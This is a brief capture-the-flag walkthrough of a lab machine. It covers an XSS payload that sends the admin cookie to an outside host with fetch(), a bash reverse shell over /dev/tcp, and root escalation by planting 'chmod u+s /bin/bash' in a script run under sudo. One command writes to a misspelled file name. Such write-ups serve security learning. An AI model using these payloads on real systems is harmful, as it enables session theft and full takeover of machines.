# Enumeration
There are two ports open:
```
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

```
Checking port 5000 there is a website and ther is a support section that might be susceptible to XSS
![](attachment/73d82d4ecb5068add7298d3a31f8834c.png)
Now trying to get the cookie as there is a cookie called is_admin but it is hashed.
![](attachment/86e4e5ac5f77610556a32c7906488dfc.png)
Now running a webserver on host and using the following XSS payload:
```html
<img src=x onerror=fetch('http://10.10.14.37/'+document.cookie);>
```
We get the cookie value:
![](attachment/bc95e7a9393251cdae4ee7e38cff04d1.png)
Using gobuster discovered /dashboard

Now using this cookie we can access /dashboard
![](attachment/d3a2475335f1cd92780d05443ef21ebf.png)
There is a code execution here
Now writing a shell.sh.
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.37/9005 0>&1
```
And using burpsuite to intercept:
![](attachment/4108bdd8ee6868856918d0d93df01cfa.png)
Now we get a shell![](attachment/8f45c417fadf086fbde0efd39f37c3e3.png)
We have sudo privilege over syscheck.
Now checking the application with strings.
![](attachment/81bfce9bb760116a81e11c1521e883b4.png)
It is calling initdb.sh
We can add something malicious in initdb.sh
```
echo "chmod u+s /bin/bash" > initdb.s
chmod +x initdb.sh
```

Now can run
```
sudo /usr/bin/syscheck
/bin/bash -p
```
And we get a root shell:
![](attachment/3cf96077b5fb778e006bd48e3801dcaa.png)